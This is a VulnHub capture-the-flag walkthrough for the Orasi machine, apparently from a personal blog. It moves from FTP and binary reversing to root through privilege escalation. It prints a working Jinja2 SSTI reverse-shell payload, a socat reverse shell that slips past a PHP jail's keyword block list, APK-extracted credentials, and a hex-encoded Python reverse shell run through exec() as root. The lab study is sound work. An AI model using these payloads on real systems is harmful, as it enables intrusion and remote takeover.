---
title: Orasi
date: 2025-02-21
excerpt: VulnHub
cover: ../uploads/cover_orasi.jpg
tags: reverse-engineering, SSTI, filter-bypass, apk-reversing
---

# Orasi: BOOT2ROOT CTF VULNHUB WRITEUP

Welcome back to another writeup! In this post, I'll be walking you through how I managed to pwn **Orasi** — a machine available on VulnHub. While **Orasi** has a reputation for being a tough box according to many in the community, I personally found it to be more approachable than expected once I broke it down step-by-step. Throughout this guide, I'll show you exactly how I tackled it. Let's dive in!!

---

# Reconnaissance
`tags: nmap, port-scanning`

Let's scan for open ports using **Nmap** for potential entry points.

`nmap -A -p- -T5 192.168.121.147`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FQskSlxXDKODb0HfENmON%252FScreenshot%2520%28796%29.png%3Falt%3Dmedia%26token%3D1b977923-a740-49d9-8447-60fc4213f7a2&width=768&dpr=3&quality=100&sign=1e3a2f03&sv=2)

Port 21(ftp), 22(ssh), 80(http), and also an http(5000)

## Vulnerability Discovered: FTP Anonymous Login

If you noticed, the ftp allow **Anonymous** access. So let's try to access ftp!

`lftp -u anonymous, 192.168.121.147`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMmRiO3ufbL8hkMsKBYm3%252FScreenshot%2520%28798%29.png%3Falt%3Dmedia%26token%3Dbdb32fb0-980c-4f90-bfae-63cee4317c19&width=768&dpr=3&quality=100&sign=d2f4069&sv=2)

Under **pub** directory, there's a file named **url**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FcRAJaHc0jix5CIH0fSuX%252FScreenshot%2520%28799%29.png%3Falt%3Dmedia%26token%3D04b94904-82e9-4763-8e18-d34fc4eaebde&width=768&dpr=3&quality=100&sign=cc04b6dd&sv=2)

It turns out that is an ELF executable binary.

Next thing I did is to transfer the **url** file to my attacker machine

`get url`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FD69ayROIU7VWv06zqOOK%252FScreenshot%2520%28800%29.png%3Falt%3Dmedia%26token%3D86563d44-f55f-44ca-8ae6-6a93a8aae7d3&width=768&dpr=3&quality=100&sign=8d3bacbd&sv=2)

At my local machine I made it executable

`chmod +x url`

and execute

`./url`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FObENF6RH7YEVR360q3zp%252FScreenshot%2520%28802%29.png%3Falt%3Dmedia%26token%3D62c9dc3a-eaf7-487c-86b2-b55ccaee9979&width=768&dpr=3&quality=100&sign=3279705f&sv=2)

Nothing useful, so I fired up Ghidra to analyze the code and dig into its logic, hoping to uncover something hidden beneath the surface.

## Vulnerability Discovered: Hardcoded Path Hidden in Binary (Reverse Engineering)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FvzekyTLkYguxDOTfWgQE%252FScreenshot%2520%28804%29.png%3Falt%3Dmedia%26token%3D0ad40ab7-e442-423a-b563-c7340e26fbb1&width=768&dpr=3&quality=100&sign=a6aeb03d&sv=2)

Notice the pattern? When we examine the **main** function more closely, some interesting behavior stands out. The code seems to be setting up values for certain operations by moving them into the source and destination indices, followed by a call to the **insert** function. Specifically, at lines 1192 and 1197, the opcodes **be** and **bf** are used, these correspond to instructions that move a value into the **ESI** (source index) and **EDI** (destination index) registers, respectively. The hexadecimal value immediately following each of these opcodes represents the actual data being assigned.

I gathered all the hexadecimal values that were assigned to the source index just before each call to the **insert** function, and here's what I found

Next thing I did is to decode this hex to ASCII using **xxd** and here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FDzUXh3l8cTtvGar5yyl4%252FScreenshot%2520%28807%29.png%3Falt%3Dmedia%26token%3D888e8453-fad0-4a47-945c-5df4645cf174&width=768&dpr=3&quality=100&sign=a86662a5&sv=2)

This seems to resemble a URL path. Speaking of URLs, let's go ahead and check out the HTTP interface to see what's there.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FuxBeiW9QLmKc3jhYCnAU%252FScreenshot%2520%28805%29.png%3Falt%3Dmedia%26token%3D954de1a9-3169-4e3a-a1d6-500bec280f3d&width=768&dpr=3&quality=100&sign=e0c420ed&sv=2)

Hmm... the sequence **6 6 1337leet** looks familiar, it resembles the kind of syntax or pattern you'd see used in a specific tool.

How about the other http? Port 5000 (Running in Python Server)

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FbNJmUiMRDoxrq0gdIilc%252FScreenshot%2520%28806%29.png%3Falt%3Dmedia%26token%3D95020599-39f1-4883-9c7a-aff1a9f0e6e9&width=768&dpr=3&quality=100&sign=f3a5aede&sv=2)

What if I add the decoded path?

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FT0RQXydjjRg5emrYPwLX%252FScreenshot%2520%28808%29.png%3Falt%3Dmedia%26token%3D409f891a-2821-4565-967d-09f065d27725&width=768&dpr=3&quality=100&sign=18d13584&sv=2)

This suggests that the path is expecting some kind of input, possibly a GET parameter. However, since we don't know the exact parameter name yet, we'll need to fuzz for it.

---

# Enumeration
`tags: crunch, ffuf, fuzzing, wordlist-generation`

Let's head back to port 80. That **6 6 1337leet** pattern? Turns out, it's actually a syntax used in **Crunch**. Maybe we can use the generated wordlist to fuzz the GET parameter.

`crunch 6 6 1337leet -o wordlist.txt`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FfZQcNGlcbO9QGWyUeUWn%252FScreenshot%2520%28809%29.png%3Falt%3Dmedia%26token%3D48cff127-4804-4596-a518-cb77ec9c0b9a&width=768&dpr=3&quality=100&sign=ad505158&sv=2)

## Fuzzing the Hidden GET Parameter

Now that we have the wordlist, let's fuzz the GET parameter using **ffuf**

`ffuf -c -u 'http://192.168.121.147:5000/sh4d0w$s?FUZZ=so_drained' -w wordlist.txt -fs 8`

The **-fs 8** option filters out responses with a size of 8. This means that, for every incorrect GET parameter, the server will return "No input" with a length of 8. However, for the correct parameter, the response size will likely vary since I've used a value longer than 8 characters. To observe the response sizes more clearly, we can remove the filter and analyze them directly. This is a fundamental step in fuzzing, just a heads-up in case you're not yet familiar with the process.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXCtKJNEPWaVTdVlsmWz0%252FScreenshot%2520%28810%29.png%3Falt%3Dmedia%26token%3Db59ac619-ed3d-418c-926d-a2c5118b06b8&width=768&dpr=3&quality=100&sign=7ddae289&sv=2)

---

# Exploitation
`tags: ssti, jinja2, reverse-shell`

## Vulnerability Discovered: Server-Side Template Injection (SSTI) in Jinja2

Eventually, I identified the correct GET parameter. Given that the server is running Python, it's likely using **jinja2**-style templates. To verify this, I tried the following payload to see if the server is vulnerable to **server-side template injection (SSTI)**.

```text
{{10*10}}
```

Here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F6WZKg7O9CCK841lfQyaJ%252FScreenshot%2520%28811%29.png%3Falt%3Dmedia%26token%3Daaccd17b-c005-4ef8-b8be-8efa18f3828c&width=768&dpr=3&quality=100&sign=75b14f6a&sv=2)

It's confirmed!! At this stage, we can establish a reverse shell. Here's the payload

```python
{% for cls in ().__class__.__base__.__subclasses__() %}{% if cls.__name__.find("warning") != -1 %}{{cls()._module.__builtins__.get('__import__')('os').popen("python3 -c 'import socket,os,pty,subprocess as sp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.121.32\",4444));[os.dup2(s.fileno(),fd) for fd in range(3)];pty.spawn(\"/bin/bash\")'")}}{% endif %}{% endfor %}
```

After running the payload through the **l333tt** parameter, we successfully gained a shell.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJLOUrU6bgCJx3J3U3IIr%252FScreenshot%2520%28813%29.png%3Falt%3Dmedia%26token%3D4bddf9eb-ee01-4796-8245-2f8e9e68aa7b&width=768&dpr=3&quality=100&sign=9844321&sv=2)

Navigating to the **home** directory, there are 2 users

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FXlWKNXjgVy3Swdh96sSl%252FScreenshot%2520%28814%29.png%3Falt%3Dmedia%26token%3D03f310cc-7328-43de-afd6-d96ed144fcbb&width=768&dpr=3&quality=100&sign=89cc926d&sv=2)

---

# Privilege Escalation (www-data → kori)
`tags: sudo-misconfiguration, php-jail-bypass, filter-bypass, socat`

## Vulnerability Discovered: Sudo Misconfiguration Allowing PHP Jail Execution

Next thing I did is to check the sudo permissions of www-data

`sudo -l`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FMXzYn9nkBREj9IjsrnUY%252FScreenshot%2520%28815%29.png%3Falt%3Dmedia%26token%3D3821c43f-70fa-4e7f-9729-17f6a43da582&width=768&dpr=3&quality=100&sign=49288d6b&sv=2)

It turns out that we can execute a PHP script as user **kori**, next thing I did is to check the content of the **jail.php**

```php
<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("Orasis Jail, argument missing\n");

function filter($var) {
        if(preg_match('/(`|bash|eval|nc|whoami|open|pass|require|include|file|system|\/)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        $result = exec($var);
        echo "$result\n";
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>
```

This is the reason why it gets harder, it's clear that the script is capable of executing commands. However, if the input contains specific keywords such as **bash, eval, nc**, and similar, it triggers a warning message saying "**restricted characters have been used.**" Additionally, the use of the slash (**/**) is also blocked, preventing us from referencing full binary paths like **/bin/bash**.

## Filter Bypass Using Socat

But they forgot something, just noticed that **socat** is not included, that's why I wonder if there's a socat in this and it has!!!! We can use socat, to spawn a shell as user kori!

Next thing I did is to establish another listener in my local machine and execute this command in the target

```shell
sudo -u kori php /home/kori/jail.php socat TCP:192.168.121.32:3333 EXEC:'sh',pty,stderr,setsid,sigint
```

Execute and it should spawn a shell

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8CTs8M1g3GMjuRTVdQcE%252FScreenshot%2520%28818%29.png%3Falt%3Dmedia%26token%3D76adec79-d941-4087-a35e-0c38eb19ed79&width=768&dpr=3&quality=100&sign=b30b5a6a&sv=2)

Next thing I did is to upgrade the shell

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FgjPAmqxifquuRJnqdP3p%252FScreenshot%2520%28820%29.png%3Falt%3Dmedia%26token%3D10d306f4-b5a5-4a72-bb39-d3afca63b6bc&width=768&dpr=3&quality=100&sign=ea23288b&sv=2)

---

# Privilege Escalation (kori → irida)
`tags: sudo-misconfiguration, file-ownership-abuse, apk-reversing, dex2jar, procyon, hardcoded-credentials`

## Vulnerability Discovered: Sudo Copy Command Abuse via File Ownership Trick

I've checked the sudo permissions of the user kori

`sudo -l`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FGpXdC8sKeoNu8IUg4wH4%252FScreenshot%2520%28821%29.png%3Falt%3Dmedia%26token%3D2b7ca524-a605-442f-b9c0-3383562f2912&width=768&dpr=3&quality=100&sign=e3e5a56c&sv=2)

It appears that the user kori has permission to copy an APK file from irida's home directory into their own directory.

`sudo -u irida cp /home/irida/irida.apk /home/kori/irida.apk`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F0vqUY55kfzd0I47RmoP8%252FScreenshot%2520%28822%29.png%3Falt%3Dmedia%26token%3Dc2396779-977c-4e20-8442-61c070f52c97&width=768&dpr=3&quality=100&sign=52396c0&sv=2)

Why permission denied?

Since we're now running commands as the user irida, we have access to the **irida.apk** file located in her home directory. However, irida doesn't have write permissions for kori's directory. To work around this, I had to modify the directory's permissions to allow write access for other users.

`chmod o+w .`

Then execute this again

`sudo -u irida cp /home/irida/irida.apk /home/kori/irida.apk`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FRehcgyCKHqtoJ8SA4wkR%252FScreenshot%2520%28823%29.png%3Falt%3Dmedia%26token%3Da4388c73-e0f1-4c1d-a9d8-63cdb397a200&width=768&dpr=3&quality=100&sign=d46b0e88&sv=2)

But there's still a problem

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FvWU87rWnB2UfrEUjaaNV%252FScreenshot%2520%28825%29.png%3Falt%3Dmedia%26token%3D39e14975-d915-4acf-a0f9-ca79ccd804f2&width=768&dpr=3&quality=100&sign=a30da704&sv=2)

As you can see, the owner is still irida even though we've successfully copied it to kori, so technically, we cannot still access the apk file. What should we do?

First we will delete the irida.apk in user kori and we will make a new one but empty

`touch irida.apk`

Then we will change file permission to **777** to give full access to everyone

`chmod 777 irida.apk`

Finally we will copy the apk again from irida

`sudo -u irida cp /home/irida/irida.apk /home/kori/irida.apk`

Here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F0lugTqYS2RAfa0RjwLNC%252FScreenshot%2520%28827%29.png%3Falt%3Dmedia%26token%3D8246c895-cff4-413b-a715-6115b8c3f341&width=768&dpr=3&quality=100&sign=ed6615f3&sv=2)

As you can see here, the owner of irida.apk is now kori!!

## Vulnerability Discovered: Hardcoded Credentials in Decompiled APK

I transfer the APK file to my local machine to decompile it

target

`php -S 0.0.0.0:1234`

attacker

`wget http://<target_ip>:1234/irida.apk`

After transfer I decompile the APK file but first let's unzip the APK file

`unzip irida.apk`

Its internal structure will be extracted along with the **classes.dex**

Next thing I did is to convert the classes.dex to Java archives using **d2j-dex2jar**

`d2j-dex2jar classes.dex`

Upon exploring the generated .class files, I found this file that seems interesting

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FlEVD1L13NHq21rduifnf%252FScreenshot%2520%28834%29.png%3Falt%3Dmedia%26token%3Da5dc8e4c-ba46-4126-8e73-20760364fc7b&width=768&dpr=3&quality=100&sign=707924c1&sv=2)

The **LoginDataSource.class** caught my eye, so all I did is to decompile it using **procyon** and here's the decompiled version

```java
// 
// Decompiled by Procyon v0.6.0
// 

package com.alienum.irida.data;

import java.util.HashMap;
import java.io.IOException;
import java.util.UUID;
import com.alienum.irida.data.model.LoggedInUser;

public class LoginDataSource
{
    public Result<LoggedInUser> login(final String s, final String s2) {
        if (s.equals("irida") && s2.equals(this.protector("1#2#3#4#5"))) {
            try {
                return new Result.Success<Object>(new LoggedInUser(UUID.randomUUID().toString(), "Irida Orasis"));
            }
            catch (final Exception cause) {
                return new Result.Error(new IOException("Error logging in", cause));
            }
        }
        return new Result.Error(new IOException("Error logging in", null));
    }
    
    public void logout() {
    }
    
    public String protector(String string) {
        final String[] split = string.split("#");
        final HashMap hashMap = new HashMap();
        hashMap.put(split[0], "eye");
        hashMap.put(split[3], "tiger");
        hashMap.put(split[4], "()");
        hashMap.put(split[1], "of");
        hashMap.put(split[2], "the");
        final StringBuilder sb = new StringBuilder();
        sb.append(hashMap.get(split[0]));
        sb.append(".");
        sb.append(hashMap.get(split[1]));
        sb.append(".");
        sb.append(hashMap.get(split[2]));
        sb.append(".");
        sb.append(hashMap.get(split[3]));
        sb.append(".");
        sb.append(hashMap.get(split[4]));
        string = sb.toString();
        System.out.println(string);
        return string;
    }
}
```

This code defines a simple login system in the **LoginDataSource** class, where the **login** method authenticates a user by checking if the username is **irida** and if the password, after being passed through a custom transformation method called **protector**, matches a specific hashed structure built from a **#**-separated string (**"1#2#3#4#5"**) mapping numeric keys to values like **"eye.of.the.tiger()"**. If the credentials match, it returns a success result with a generated **UUID** and the name **Irida Orasis**; otherwise, it returns an error. The **protector** method acts as a basic obfuscation mechanism for the expected password.

This strongly indicates that the password for the user irida is being revealed here, but where exactly? If you recall from our **Nmap** scan, the SSH service is open. It's possible that the password found in the code belongs to irida. If that's the case, we might be able to log in via SSH using her credentials.

`ssh irida@192.168.121.147`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FP4Ex5peO3FXoYdNGyaIv%252FScreenshot%2520%28835%29.png%3Falt%3Dmedia%26token%3Dceb3a2ed-7191-4dee-acd0-47ed0794acb1&width=768&dpr=3&quality=100&sign=bd178679&sv=2)

It works!!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F0jO3lYmAp9LJtquiWmFE%252FScreenshot%2520%28836%29.png%3Falt%3Dmedia%26token%3Dea33203e-2167-4b1e-ba12-0589289141c1&width=768&dpr=3&quality=100&sign=d8071422&sv=2)

---

# Privilege Escalation (irida → root)
`tags: sudo-misconfiguration, python-code-injection, exec-function-abuse, reverse-shell`

## Vulnerability Discovered: Unsafe Use of Python exec() on Hex-Decoded Input

Now it's time to escalate privilege

First thing is to check the sudo permissions as always

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fb9KIuWmvDFmFmV5OduTk%252FScreenshot%2520%28837%29.png%3Falt%3Dmedia%26token%3Db895279d-d809-4739-aedb-23b0d2f0670d&width=768&dpr=3&quality=100&sign=31875e02&sv=2)

As shown here, we are allowed to execute a Python script as root, but we don't have the permission to read the file. So our only option here is to execute the script

`sudo python3 /root/oras.py`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fzpo8H0VHRWlQdUpBElvx%252FScreenshot%2520%28839%29.png%3Falt%3Dmedia%26token%3D03d75621-7e6b-450b-85a7-71fc085f2ed6&width=768&dpr=3&quality=100&sign=6e2a1b2a&sv=2)

The input is expected to be in **hexadecimal byte** format, which will then be decoded into a string. So, we need to adjust the command accordingly.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FhdqObNIDKRuhpgjP4k0C%252FScreenshot%2520%28841%29.png%3Falt%3Dmedia%26token%3D05bfb6d3-09b8-47dc-b8ed-da0762c2fcbf&width=768&dpr=3&quality=100&sign=f2a7d777&sv=2)

It appears that Python commands can be injected, as the input is being passed directly to the **exec** function. This function can execute multiple lines of Python code, making it a potential injection point.

My plan here is to execute a reverse shell payload. But before that, we'll set up a listener on our attacker machine. If everything works as intended, it should grant us a root shell.

```shell
python3 -c "print(b"import socket,os,pty;s=socket.socket();s.connect(('192.168.121.32',5454));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('sh')".hex())" | sudo python3 /root/oras.py
```

Execute and here's the result

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FVsHKXLfWzWJPUwuXkBiO%252FScreenshot%2520%28842%29.png%3Falt%3Dmedia%26token%3Dac2eadd2-c6e3-444f-bb9c-5f61e4dafe13&width=768&dpr=3&quality=100&sign=1d098cae&sv=2)

It works!!! We're now root!!

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUJq7L1QmDlH6SN31NPgb%252FScreenshot%2520%28844%29.png%3Falt%3Dmedia%26token%3D6b017c54-aae1-47cd-9919-c555662c1ad3&width=768&dpr=3&quality=100&sign=fdc1f5e0&sv=2)

We've successfully pwned Orasi!

---

# Conclusion

This Boot2Root challenge was quite a journey, definitely time-consuming and a bit lengthy to work through, haha. However, it was packed with valuable learning experiences. It covered a wide range of concepts essential to both CTF competitions and real-world ethical hacking, including reverse engineering, crafting reverse shells, and adapting when standard tools aren't available. It really emphasizes the importance of creativity, persistence, and a solid understanding of system behavior. Challenges like this push you to think outside the box and sharpen your problem-solving skills, all while having a bit of fun along the way.
